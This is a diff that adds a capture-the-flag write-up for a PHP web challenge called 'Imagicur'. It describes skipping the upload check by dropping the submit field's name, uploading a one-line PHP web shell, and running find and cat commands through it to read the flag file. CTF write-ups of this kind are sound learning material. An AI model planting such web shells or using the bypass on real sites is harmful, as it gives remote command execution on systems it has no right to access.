@@ -267,3 +267,17 @@ Let's check out the function `flaggy` where the magic happens.
 **This** is where the magic happens.
 
 But when reading this, something stood out to me. Input is never modified :think:. So, what happens if we take str1, and subtract 100 from every codepoint? Well, we get the flag. This was an easy task after all! :)
+
+## [Web // 150pt] Imagicur
+
+We need to _heck_ a PHP website (nothing new here). We're given the source code, and we quickly spot that the image validation only happens if `$_POST["submit"]` is set. So let's uplaod an _image_ with the cute picture and remove the `name` attr from the submit button
+
+```php
+<?php system($_GET[0]) ?>
+```
+
+And then go to the website we're rewarded with.
+
+Now let's add the query `...?0=find / -name 'flag.txt'`. After that we find that the flag is at `/var/www/html/flag.txt`, and we can go the website with the query params `...?0=cat /var/www/html/flag.txt`.
+
+Ta-da. :tada:
